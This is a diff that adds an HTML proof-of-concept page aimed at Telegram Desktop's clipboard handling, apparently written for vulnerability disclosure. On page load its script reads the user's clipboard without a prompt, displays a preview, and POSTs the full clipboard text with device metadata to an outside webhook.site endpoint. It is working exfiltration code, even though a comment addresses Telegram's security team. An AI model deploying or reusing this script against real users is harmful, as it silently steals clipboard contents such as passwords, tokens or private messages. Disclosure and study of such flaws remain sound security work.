@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Telegram Desktop clipboard — disclosure PoC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body { font: 14px/1.5 ui-monospace, Menlo, Consolas, monospace; padding: 16px; white-space: pre-wrap; }
+  h1 { font-size: 16px; margin: 0 0 12px; }
+  .ok  { color: #b00020; }
+  .blk { color: #006400; }
+</style>
+</head>
+<body>
+<h1>Telegram Desktop clipboard — disclosure PoC</h1>
+<div id="out">Running test...</div>
+<script>
+const SINK = "https://webhook.site/dee16761-ba62-42ce-9666-02e016174122";
+
+(async () => {
+  const out = document.getElementById("out");
+  const tg  = window.Telegram && window.Telegram.WebApp;
+  const meta = {
+    platform: (tg && tg.platform) || "n/a",
+    version:  (tg && tg.version)  || "n/a",
+    isSecureContext: isSecureContext,
+    userAgent: navigator.userAgent,
+    time: new Date().toISOString()
+  };
+
+  try {
+    const t = await navigator.clipboard.readText();
+    out.className = "ok";
+    out.innerText =
+      "Result: clipboard read WITHOUT prompt\n\n" +
+      "length: " + t.length + " chars\n" +
+      "preview (first 120 chars):\n" + t.slice(0, 120) + "\n\n" +
+      JSON.stringify(meta, null, 2);
+
+    // End-to-end demonstration for the Telegram Security team:
+    // value is posted to a public inbox you can observe in real time.
+    try {
+      await fetch(SINK, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ clipboard: t, meta })
+      });
+    } catch (_) { /* network may be restricted; on-screen result is sufficient */ }
+  } catch (e) {
+    out.className = "blk";
+    out.innerText =
+      "Prompted or blocked by the platform: " + e.name + ": " + e.message + "\n\n" +
+      JSON.stringify(meta, null, 2);
+  }
+})();
+</script>
+</body>
+</html>
